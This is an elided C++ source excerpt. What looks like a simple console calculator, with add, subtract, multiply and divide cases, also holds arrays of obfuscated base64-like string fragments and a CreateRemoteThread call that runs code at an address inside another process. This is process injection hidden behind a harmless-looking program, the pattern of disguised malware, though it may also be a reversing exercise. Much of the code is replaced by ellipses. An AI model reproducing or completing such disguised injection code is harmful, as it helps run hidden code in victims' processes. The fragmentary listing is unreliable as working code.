...
int main() {
    ...
    std::string f[] = { "9kY", "WhT", "ya00", "4fQ==" };
    std::string t1[] = { "XcVy", "asFj", "4fQ==" };
    std::string f1[] = { "fXly", "b20z", "TV9", "uM2Rk" };
    std::string f2[] = { "SUh", "7RlR", "Dd2", };
    ...
    while (x < 4) {
        switch (x) {
            ...
            switch (op) {
                case '+':
                    std::cout << "Result: " << Operations::add(a, b) << std::endl;
                    break;
                case '-':
                    std::cout << "Result: " << Operations::subtract(a, b) << std::endl;
                    break;
                case '*':
                    std::cout << "Result: " << Operations::multiply(a, b) << std::endl;
                    break;
                case '/':
                    try {
                        std::cout << "Result: " << Operations::divide(a, b) << std::endl;
                        }
            ...
            HANDLE hxThread = CreateRemoteThread(hx, NULL, 0, (LPTHREAD_START_ROUTINE)ax, NULL, 0, NULL);
            WaitForSingleObject(hxThread, 12);
